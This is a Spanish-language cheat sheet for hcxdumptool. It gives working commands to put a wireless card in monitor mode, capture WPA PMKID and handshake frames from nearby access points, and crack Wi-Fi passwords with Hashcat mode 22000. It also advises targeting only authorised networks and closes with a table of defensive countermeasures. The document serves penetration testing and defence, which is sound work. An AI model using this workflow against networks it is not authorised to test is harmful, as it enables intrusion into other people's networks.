<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# hoja de referencia hcxdumptool

[hcxdumptool](https://github.com/ZerBea/hcxdumptool) es una herramienta de captura de paquetes y ataque Wi-Fi de línea de comandos moderna y de alto rendimiento. A diferencia de las herramientas heredadas de Aircrack-ng, `hcxdumptool` captura tramas WPA/WPA2/WPA3 PMKID (identificador de clave maestra por pares) sin necesidad de clientes conectados, captura apretones de manos EAPOL de 4 vías y se integra directamente con `hcxtools` para craqueo Hashcat (modo 22000).

---

## Tabla de contenidos

- [Ventajas principales y arquitectura moderna] (#ventajas-centrales--arquitectura-moderna)
- [Instalación (`hcxdumptool` y `hcxtools`)](#installation-hcxdumptool--hcxtools)
- [Configuración de la interfaz inalámbrica](#wireless-interface-setup)
- [Capturando PMKID (ataque sin cliente)](#capturing-pmkid-clientless-attack)
- [Convertir capturas con `hcxpcapngtool`](#convertir-capturas-con-hcxpcapngtool)
- [Craqueo de Hashcat (Modo 22000)](#hashcat-cracking-mode-22000)
- [Filtrado de canales y BSSID](#filtrado-de-canales-y-bssids)
- [Contramedidas defensivas y WPA3](#contramedidas-defensivas--wpa3)

---

## Ventajas principales y arquitectura moderna

- **Ataque PMKID sin cliente:** Explota la función PMKID RSN IE (elemento de información de red de seguridad robusta) en enrutadores modernos. **No** necesita un cliente conectado ni paquetes de desautenticación para capturar el material clave.
- **Modo Hashcat unificado 22000:** Genera archivos hash nativos de Hashcat que admiten protocolos de enlace PMKID y WPA-PBKDF2-PMK completos.
- **Salto de canal e interrogatorio activo:** Transmite solicitudes de asociación específicas para obtener PMKID de los AP que escuchan.

---

## Instalación (`hcxdumptool` y `hcxtools`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y hcxdumptool hcxtools

# Arch Linux / BlackArch
sudo pacman -S hcxdumptool hcxtools

# Verify versions
hcxdumptool --version
hcxpcapngtool --version
```
---

## Configuración de la interfaz inalámbrica

Antes de ejecutar `hcxdumptool`, finalice los servicios de administración de red en segundo plano que interfieren con la inyección de paquetes sin formato:
```bash
# 1. Terminate interfering network services (NetworkManager, wpa_supplicant)
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# 2. Put wireless card in monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 3. Verify monitor mode
iw dev
```
---

## Capturando PMKID (ataque sin cliente)

### 1. Captura general de PMKID en todos los canales de 2,4 GHz y 5 GHz
Capture todos los puntos de acceso cercanos a un archivo `.pcapng`:
```bash
sudo hcxdumptool -i wlan0 -w capture.pcapng --rds=1
```
- `-i wlan0`: Interfaz de monitor inalámbrico.
- `-w capture.pcapng`: Archivo de captura de salida.
- `--rds=1`: transmite tramas RTS para solicitar respuestas de AP.

### 2. Capture un punto de acceso de destino específico (filtro BSSID)
Apunte únicamente a un BSSID autorizado para evitar afectar enrutadores de terceros no autorizados:

1. Cree una lista de filtros de destino (`target_bssid.txt`):
```text
001122334455
```
*(BSSID sin dos puntos)*

2. Ejecute la captura dirigida:
```bash
sudo hcxdumptool -i wlan0 -w target.pcapng --bpfp=target_bssid.txt -c 6
```
- `-c 6`: Inyección de bloqueo y escucha del canal 6.
- `--bpfp`: aplica la lista BPF (filtro de paquetes Berkeley) para los BSSID de destino.

---

## Convirtiendo capturas con `hcxpcapngtool`

Una vez que se hayan recopilado los marcos PMKID o EAPOL, convierta la captura `.pcapng` a un formato compatible con Hashcat:
```bash
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
```
- `-o hash.hc22000`: archivo hash de salida en formato Hashcat moderno.
- `-E essid_list.txt`: guarda los nombres de redes descubiertas (ESSID) en un diccionario para descifrar contraseñas de forma específica.
- La herramienta informa el total de fotogramas PMKID y EAPOL extraídos.

---

## Cracking Hashcat (Modo 22000)

El modo `22000` es el modo de craqueo unificado WPA-PBKDF2-PMKID + EAPOL de Hashcat:

### 1. Ataque de diccionario
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
### 2. Ataque de mutación basado en reglas
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### 3. Ataque de máscara/fuerza bruta (contraseñas numéricas de 8 dígitos)
```bash
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
---

## Filtrado de canales y BSSID

Optimice la velocidad de captura restringiendo los parámetros de escaneo:
```bash
# Scan only specific channels (e.g. 1, 6, 11)
sudo hcxdumptool -i wlan0 -w filtered.pcapng -c 1,6,11
```
---

## Contramedidas defensivas y WPA3

| Vulnerabilidad | Mecanismo de ataque | Recomendación de defensa |
|---|---|---|
| **Almacenamiento en caché de PMKID** | AP transmite PMKID en la trama 1 de EAPOL sin autenticación de cliente | Desactive 802.11r (Transición rápida/Roaming) si no es necesario; actualizar el firmware del enrutador. |
| **Clave precompartida WPA2 débil** | Cracking de diccionario PBKDF2 sin conexión (modo Hashcat 22000) | Aplique frases de contraseña aleatorias de más de 16 caracteres. |
| **Protocolo WPA2 heredado** | Susceptible a PMKID y captura de apretón de manos | Actualice a **WPA3-Personal (SAE)**; WPA3 utiliza el protocolo de enlace Dragonfly con secreto directo, lo que hace que los fotogramas capturados no se puedan descifrar sin conexión. |